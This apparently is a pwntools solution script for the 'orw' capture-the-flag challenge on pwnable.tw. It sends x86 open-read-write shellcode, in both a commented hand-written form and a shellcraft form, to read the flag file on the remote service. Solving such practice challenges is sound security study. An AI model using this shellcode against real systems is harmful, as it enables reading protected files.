#!/usr/bin/python

from pwn import *

context.update(log_level='debug', arch='i386', os='linux')

#p = process('./orw')
p = remote('chall.pwnable.tw', 10001)

#shellcode = asm("""
#    mov eax, 5
#    push 0x00006761
#    push 0x6c662f77
#    push 0x726f2f65
#    push 0x6d6f682f
#    mov ebx, esp
#    xor ecx, ecx
#    xor edx, edx
#    int 0x80
#
#    mov ebx, eax
#    mov eax, 3
#    mov ecx, 0x804a060 + 200 - 64
#    mov edx, 64
#    int 0x80
#
#    mov eax, 4
#    mov ebx, 1
#    mov ecx, 0x804a060 + 200 - 64
#    mov edx, 64
#    int 0x80
#    """)
#
#p.send(shellcode)

shellcode = ''
shellcode += shellcraft.pushstr('/home/orw/flag')
shellcode += shellcraft.open('esp', 0, 0)
shellcode += shellcraft.read('eax', 'esp', 64)
shellcode += shellcraft.write(1, 'esp', 64)

p.sendafter(':', asm(shellcode))

log.success(p.recv(4096))
